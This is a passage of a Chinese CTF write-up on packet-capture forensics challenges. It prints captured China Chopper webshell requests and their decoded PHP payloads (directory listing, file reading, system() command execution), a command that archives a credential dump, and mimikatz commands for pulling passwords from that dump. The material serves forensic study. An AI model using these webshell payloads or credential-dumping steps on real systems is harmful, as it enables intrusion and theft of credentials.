class="line">|&lt;-</span><br></pre></td></tr></table></figure><p>z0参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@set_magic_quotes_runtime(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;-&gt;|&quot;</span>);;</span><br><span class="line">$D=base64_decode($_POST[<span class="string">&quot;z1&quot;</span>]);</span><br><span class="line">$F=@opendir($D);</span><br><span class="line"><span class="keyword">if</span>($F==<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;ERROR:// Path Not Found Or No Permission!&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$M=<span class="literal">NULL</span>;</span><br><span class="line">$L=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">while</span>($N=@readdir($F))&#123;</span><br><span class="line">$P=$D.<span class="string">&quot;/&quot;</span>.$N;</span><br><span class="line">$T=@date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>,@filemtime($P));</span><br><span class="line">@$E=substr(base_convert(@fileperms($P),<span class="number">10</span>,<span class="number">8</span>),<span class="number">-4</span>);</span><br><span class="line">$R=<span class="string">&quot;\t&quot;</span>.$T.<span class="string">&quot;\t&quot;</span>.@filesize($P).<span class="string">&quot;\t&quot;</span>.$E.<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(@is_dir($P))</span><br><span class="line">$M.=$N.<span class="string">&quot;/&quot;</span>.$R;</span><br><span class="line"><span class="keyword">else</span> $L.=$N.$R;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $M.$L;</span><br><span class="line">@closedir($F);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;|&lt;-&quot;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>接受z1传递过来的参数，打开z1目录，并输出时间、文件大小、以及文件权限。</p><p>z1参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br></pre></td></tr></table></figure><p>第三个包是查看文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISG2014=%<span class="number">40</span><span class="keyword">eval</span>%<span class="number">01</span>%<span class="number">28</span>base64_decode%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>Bz0%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">29</span>%<span class="number">3</span>B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%<span class="number">2</span>BfCIpOzskRj1nZXRfbWFnaWNfcXVvdGVzX2dwYygpP3N0cmlwc2xhc2hlcygkX1BPU1RbInoxIl0pOiRfUE9TVFsiejEiXTskZnA9QGZvcGVuKCRGLCJyIik7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oIkVSUk9SOi8vIENhbiBOb3QgUmVhZCIpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=%<span class="number">2</span>Fvar%<span class="number">2</span>Fwww%<span class="number">2</span>Fhtml%<span class="number">2</span>Fisg.php</span><br></pre></td></tr></table></figure><p>其中z1参数为<code>/var/www/html/isg.php</code></p><p>第四个包同理查看文件内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;x.tar.gz</span><br></pre></td></tr></table></figure><p>该文件的内容应该就是flag了。这里我们直接使用binwalk分离</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  TRF03 Chopper binwalk -e Chopper&#x2F;Chopper.pcap</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             Libpcap capture file, little-endian, version 2.4, Ethernet, snaplen: 65535</span><br><span class="line">7490          0x1D42          gzip compressed data, from Unix, last modified: 2014-09-07 16:17:54</span><br></pre></td></tr></table></figure><p>是一个linux的压缩包文件，修改后缀.tar.gz拿到flag。</p><h2 id="Router"><a href="#Router" class="headerlink" title="Router"></a>Router</h2><p>ftp名字为sftp，应该是ftp流量分析。追踪tcp发现ftp登录操作，并涉及到一个zip压缩包。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">220</span> (vsFTPd <span class="number">3.0</span><span class="number">.2</span>)</span><br><span class="line">USER forensics</span><br><span class="line"><span class="number">331</span> Please specify the password.</span><br><span class="line">PASS passw0rd</span><br><span class="line"><span class="number">230</span> Login successful.</span><br><span class="line">SYST</span><br><span class="line"><span class="number">215</span> UNIX Type: L8</span><br><span class="line">FEAT</span><br><span class="line"><span class="number">211</span>-Features:</span><br><span class="line"> EPRT</span><br><span class="line"> EPSV</span><br><span class="line"> MDTM</span><br><span class="line"> PASV</span><br><span class="line"> REST STREAM</span><br><span class="line"> SIZE</span><br><span class="line"> TVFS</span><br><span class="line"> UTF8</span><br><span class="line"><span class="number">211</span> End</span><br><span class="line">OPTS UTF8 ON</span><br><span class="line"><span class="number">200</span> Always <span class="keyword">in</span> UTF8 mode.</span><br><span class="line">PWD</span><br><span class="line"><span class="number">257</span> <span class="string">&quot;/&quot;</span></span><br><span class="line">TYPE I</span><br><span class="line"><span class="number">200</span> Switching to Binary mode.</span><br><span class="line">PASV</span><br><span class="line"><span class="number">227</span> Entering Passive Mode (<span class="number">172</span>,<span class="number">16</span>,<span class="number">4</span>,<span class="number">236</span>,<span class="number">203</span>,<span class="number">159</span>).</span><br><span class="line">CWD /</span><br><span class="line"><span class="number">250</span> Directory successfully changed.</span><br><span class="line">LIST</span><br><span class="line"><span class="number">150</span> Here comes the directory listing.</span><br><span class="line"><span class="number">226</span> Directory send OK.</span><br><span class="line">PASV</span><br><span class="line"><span class="number">227</span> Entering Passive Mode (<span class="number">172</span>,<span class="number">16</span>,<span class="number">4</span>,<span class="number">236</span>,<span class="number">86</span>,<span class="number">60</span>).</span><br><span class="line">CWD /files/</span><br><span class="line"><span class="number">250</span> Directory successfully changed.</span><br><span class="line">LIST</span><br><span class="line"><span class="number">150</span> Here comes the directory listing.</span><br><span class="line"><span class="number">226</span> Directory send OK.</span><br><span class="line">PASV</span><br><span class="line"><span class="number">227</span> Entering Passive Mode (<span class="number">172</span>,<span class="number">16</span>,<span class="number">4</span>,<span class="number">236</span>,<span class="number">155</span>,<span class="number">254</span>).</span><br><span class="line">SIZE /files/zip.zip</span><br><span class="line"><span class="number">213</span> <span class="number">12092</span></span><br><span class="line">MDTM /files/zip.zip</span><br><span class="line"><span class="number">213</span> <span class="number">20140913131803</span></span><br><span class="line">RETR /files/zip.zip</span><br><span class="line"><span class="number">150</span> Opening BINARY mode data connection <span class="keyword">for</span> /files/zip.zip (<span class="number">12092</span> bytes).</span><br><span class="line"><span class="number">226</span> Transfer complete.</span><br></pre></td></tr></table></figure><p>继续查看每个流发现一个PK头，最底有个flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PK........%j-E8I.......2......flag.pngUT...|.T*|.Tux...............eP\[.6. . ...;A.;..kpm.5......4.&#123;.....A.k......wj~...N.:u....^.9..Z&#123;......D#B&#123;.........W....-P...3</span><br><span class="line">bb^..r.....~&#125;...O.....x.1...E...7..o..*]uOVV..&#x2F;..a...G.......a#....F.J.|4....C0k...ZS.....;.#s-.$...+)..(.Qy...M..U..Pe......a..3.....[....Y.zI..U...J&#39;.v......I....M.7.&#125;...OR....e_._......X..........?0.3...k..e.Zb.....q4..</span><br><span class="line">.F:+E.x.........rH.....H&#x3D;..A.....%...............9..3*S...W.^3...K...s......&#96;..X..G.</span><br><span class="line">......AS....eE..........-.O.?..%...&amp;...D.rn.....l..</span><br><span class="line">s...[...j.r.Mq.U...+...%H..j[&#96;.....&#x2F;..u..........f.&#123;....Nn.e.\..-.&#125;.R.G.0...&#39;..6![k.*.</span><br><span class="line">...4..J.......nmmqe..3...\.....k....z9qx.CmG7.....;n.....q..,.+?.5..&#x3D;_&gt;......Mx.....s&lt;&#x2F;.o.b.~........zC1....k.t...\.PC~....wj.w.m..]..qZ..l.....&#39;....p..._...0.^..... e..........|qnq&#x3D;.-......</span><br><span class="line">$T&#123;.Z4..6N.L..&lt;&gt;.......</span><br><span class="line">........</span><br><span class="line">.7.s....&amp;F....vq..5....#.P8....B..d.._.,e........+.:.....r......T...\..@@Y...A..;....jrD</span><br><span class="line">)..W.&#x2F;9ie.J.&#x2F;!..PK..........%j-E8I.......2....................flag.pngUT....|.Tux.............PK..........N.........</span><br></pre></td></tr></table></figure><p>直接保存原始数据，解压拿到flag。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201017141158783.png" alt="image-20201017141158783"></p><h2 id="SimpleProtocol"><a href="#SimpleProtocol" class="headerlink" title="SimpleProtocol"></a>SimpleProtocol</h2><p>查看了一下，大多是http请求，后来数据包太多了，直接搜索flag，直接就看到flag。</p><h2 id="Backdoor"><a href="#Backdoor" class="headerlink" title="Backdoor"></a>Backdoor</h2><p>POST /innerIntf/sorsi.html</p><h2 id="Capture-the-Hacker"><a href="#Capture-the-Hacker" class="headerlink" title="Capture the Hacker"></a>Capture the Hacker</h2><p>提示：</p><p>这是捕获的黑客攻击数据包，LateRain用户的密码在此次攻击中泄露了，你能找到吗？FLAG格式：SCTF{LateRain的明文密码}。</p><p>看了一下大概26个包，第一个包主要是连接shell，可以看到目标是windows系统。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /config.php HTTP/<span class="number">1.1</span></span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">X-Forwarded-<span class="keyword">For</span>: <span class="number">136.0</span><span class="number">.217</span><span class="number">.252</span></span><br><span class="line">Referer: http:<span class="comment">//192.168.30.170</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/<span class="number">4.0</span> (compatible; MSIE <span class="number">6.0</span>; Windows NT <span class="number">5.1</span>)</span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.30</span><span class="number">.170</span></span><br><span class="line">Content-Length: <span class="number">687</span></span><br><span class="line">Connection: Close</span><br><span class="line"></span><br><span class="line">yo=%<span class="number">40</span><span class="keyword">eval</span>%<span class="number">01</span>%<span class="number">28</span>base64_decode%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>Bz0%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">29</span>%<span class="number">3</span>B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%<span class="number">2</span>BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%<span class="number">3</span>D%<span class="number">3</span>DHTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Connection: close</span><br><span class="line">Date: Fri, <span class="number">14</span> Nov <span class="number">2014</span> <span class="number">14</span>:<span class="number">47</span>:<span class="number">48</span> GMT</span><br><span class="line">Server: Microsoft-IIS/<span class="number">6.0</span></span><br><span class="line">X-Powered-By: ASP.NET</span><br><span class="line">X-Powered-By: PHP/<span class="number">5.4</span><span class="number">.32</span></span><br><span class="line">Content-type: text/html</span><br><span class="line">Content-Length: <span class="number">147</span></span><br><span class="line"></span><br><span class="line">-&gt;|c:\inetpub\wwwrootC:Windows NT ROOT<span class="number">-53</span>DD5427BC <span class="number">5.2</span> build <span class="number">3790</span> (Windows Server <span class="number">2003</span> Enterprise Edition Service Pack <span class="number">2</span>) i586(NETWORK SERVICE)|&lt;-</span><br></pre></td></tr></table></figure><p>数据包中大多是一些连接shell之后的操作，比如列目录等等。</p><p>其中有一个数据包是打包根目录，具体细节看<code>https://www.cnblogs.com/fetty/p/4769279.html</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">POST /config.php HTTP/<span class="number">1.1</span></span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">X-Forwarded-<span class="keyword">For</span>: <span class="number">136.0</span><span class="number">.217</span><span class="number">.252</span></span><br><span class="line">Referer: http:<span class="comment">//192.168.30.170</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/<span class="number">4.0</span> (compatible; MSIE <span class="number">6.0</span>; Windows NT <span class="number">5.1</span>)</span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.30</span><span class="number">.170</span></span><br><span class="line">Content-Length: <span class="number">733</span></span><br><span class="line">Connection: Close</span><br><span class="line"></span><br><span class="line">yo=%<span class="number">40</span><span class="keyword">eval</span>%<span class="number">01</span>%<span class="number">28</span>base64_decode%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>Bz0%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">29</span>%<span class="number">3</span>B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%<span class="number">2</span>BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%<span class="number">3</span>D&amp;z1=Y21k&amp;z2=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJkM6XHByb2dyYX4xXFdpblJBUlxyYXIgYSBDOlxJbmV0cHViXHd3d3Jvb3RcYmFja3VwXHd3d3Jvb3QucmFyIEM6XEluZXRwdWJcd3d3cm9vdFxiYWNrdXBcMS5naWYgLWhwSkpCb29tJmVjaG8gW1NdJmNkJmVjaG8gW0VdHTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Connection: close</span><br><span class="line">Date: Fri, <span class="number">14</span> Nov <span class="number">2014</span> <span class="number">14</span>:<span class="number">49</span>:<span class="number">43</span> GMT</span><br><span class="line">Server: Microsoft-IIS/<span class="number">6.0</span></span><br><span class="line">X-Powered-By: ASP.NET</span><br><span class="line">X-Powered-By: PHP/<span class="number">5.4</span><span class="number">.32</span></span><br><span class="line">Content-type: text/html</span><br><span class="line">Content-Length: <span class="number">370</span></span><br><span class="line"></span><br><span class="line">-&gt;|</span><br><span class="line">  </span><br><span class="line">这里就是windows下使用rar命令的情况</span><br><span class="line">RAR <span class="number">5.10</span> beta <span class="number">4</span>    .... (C) <span class="number">1993</span><span class="number">-2014</span> Alexander Roshal    <span class="number">6</span> .... <span class="number">2014</span></span><br><span class="line">........ ........ - <span class="number">3000</span>Yuan</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">..................</span><br><span class="line">........ C:\Inetpub\wwwroot\backup\<span class="number">1.</span>gifarchive ?.k?..</span><br><span class="line">.... <span class="number">12</span>%.... <span class="number">25</span>%.... <span class="number">38</span>%.... <span class="number">50</span>%.... <span class="number">63</span>%.... <span class="number">76</span>%.... <span class="number">89</span>%...<span class="number">.100</span>%..... </span><br><span class="line">...... RAR %d.%d .......... </span><br><span class="line">............................ RAR ..............</span><br><span class="line">[S]</span><br><span class="line">c:\inetpub\wwwroot</span><br><span class="line">[E] </span><br><span class="line">|&lt;-</span><br></pre></td></tr></table></figure><p>其中一个数据包是打开rar文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yo&#x3D;%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0&#x3D;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRj1nZXRfbWFnaWNfcXVvdGVzX2dwYygpP3N0cmlwc2xhc2hlcygkX1BPU1RbInoxIl0pOiRfUE9TVFsiejEiXTskZnA9QGZvcGVuKCRGLCJyIik7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oIkVSUk9SOi8vIENhbiBOb3QgUmVhZCIpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1&#x3D;C%3A%5C%5Cinetpub%5C%5Cwwwroot%5C%5Cbackup%5C%5Cwwwroot.rar</span><br></pre></td></tr></table></figure><p>解码查看一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">@set_magic_quotes_runtime(0);</span><br><span class="line">echo(&quot;-&gt;|&quot;);;</span><br><span class="line">$F&#x3D;get_magic_quotes_gpc()?stripslashes($_POST[&quot;z1&quot;]):$_POST[&quot;z1&quot;];</span><br><span class="line">$fp&#x3D;@fopen($F,&quot;r&quot;);</span><br><span class="line">if(@fgetc($fp))&#123;</span><br><span class="line">@fclose($fp);</span><br><span class="line">@readfile($F);</span><br><span class="line">&#125;else</span><br><span class="line">&#123;</span><br><span class="line">echo(&quot;ERROR:&#x2F;&#x2F; Can Not Read&quot;);</span><br><span class="line">&#125;;</span><br><span class="line">echo(&quot;|&lt;-&quot;);</span><br><span class="line">die();</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\\inetpub\\wwwroot\\backup\\wwwroot.rar</span><br></pre></td></tr></table></figure><p>接下来是打开rar文件，解码查看一下具体命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">@set_magic_quotes_runtime(0);</span><br><span class="line">echo(&quot;&gt;|&quot;);;</span><br><span class="line">$p&#x3D;base64_decode($_POST[&quot;z1&quot;]);</span><br><span class="line">$s&#x3D;base64_decode($_POST[&quot;z2&quot;]);</span><br><span class="line">$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$c&#x3D;substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;?&quot;-c \&quot;&#123;$s&#125;\&quot;&quot;:&quot;&#x2F;c \&quot;&#123;$s&#125;\&quot;&quot;;</span><br><span class="line">$r&#x3D;&quot;&#123;$p&#125; &#123;$c&#125;&quot;;</span><br><span class="line">@system($r.&quot; 2&gt;&amp;1&quot;,$ret);</span><br><span class="line">print ($ret!&#x3D;0)?&quot;</span><br><span class="line">ret&#x3D;&#123;$ret&#125;</span><br><span class="line">&quot;:&quot;&quot;;;</span><br><span class="line">echo(&quot;|&lt;-&quot;);</span><br><span class="line">die();</span><br></pre></td></tr></table></figure><p>Z2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;d &quot;c:\inetpub\wwwroot\&quot;&amp;C:\progra~1\WinRAR\rar a C:\Inetpub\wwwroot\backup\wwwroot.rar C:\Inetpub\wwwroot\backup\1.gif -hpJJBoom&amp;echo [S]&amp;cd&amp;echo [E]</span><br></pre></td></tr></table></figure><p>Z1:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd  -c cd &#x2F;d &quot;c:\inetpub\wwwroot\&quot;&amp;C:\progra~1\WinRAR\rar a C:\Inetpub\wwwroot\backup\wwwroot.rar C:\Inetpub\wwwroot\backup\1.gif -hpJJBoom&amp;echo [S]&amp;cd&amp;echo [E] 2&gt;&amp;1 </span><br></pre></td></tr></table></figure><p>将压缩包提取出来，这里直接使用binwalk但是发现需要密码。JJBoom就是密码打开之后发现有一个1,gif但是大小为9M很可疑。</p><p>使用mimikatz破解密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">log d:\1.txt      #这一句很关键，将回显输出到一个文件中  </span><br><span class="line">sekurlsa::minidump 1.gif</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure><h2 id="slimple"><a href="#slimple" class="headerlink" title="slimple"></a>slimple</h2><p>从 leftover capture data可以看出是鼠标流量。每一个数据包的数据区有四个字节，第一个字节代表按键，当取0x00时，代表没有按键、为0x01时，代表按左键，为0x02时，代表当前按键为右键。第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。第三个字节与第二字节类似，代表垂直上下移动的偏移</p><p>tshark提取信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ tshark -r &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;simple.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure><p>python解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">nums &#x3D; []</span><br><span class="line">keys &#x3D; open(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;usbdata.txt&#39;,&#39;r&#39;)</span><br><span class="line">keys2 &#x3D; open(&#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady.txt&#39;,&#39;w&#39;)</span><br><span class="line">posx &#x3D; 0</span><br><span class="line">posy &#x3D; 0</span><br><span class="line">for line in keys:</span><br><span class="line">    if len(line) !&#x3D; 9 :</span><br><span class="line">         continue</span><br><span class="line">    x &#x3D; int(line[2:4],16)</span><br><span class="line">    y &#x3D; int(line[4:6],16)</span><br><span class="line">    if x &gt; 127 :</span><br><span class="line">        x -&#x3D; 256</span><br><span class="line">    if y &gt; 127 :</span><br><span class="line">        y -&#x3D; 256</span><br><span class="line">    posx +&#x3D; x</span><br><span class="line">    posy +&#x3D; y</span><br><span class="line">    btn_flag &#x3D; int(line[0:2],16)</span><br><span class="line">    if btn_flag &#x3D;&#x3D; 1 :</span><br><span class="line">        print posx , posy</span><br><span class="line">        steady&#x3D;str(posx)+&quot; &quot;+str(posy)</span><br><span class="line">        keys2.write(steady+&quot;\n&quot;)</span><br><span class="line">keys.close()</span><br></pre></td></tr></table></figure><p>拿到坐标之后画图，拿到flag。</p><h2 id="sqlinject"><a href="#sqlinject" class="headerlink" title="sqlinject"></a>sqlinject</h2><p>提取数数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f=open(<span class="string">&quot;/Users/apple/Desktop/access.log&quot;</span>,<span 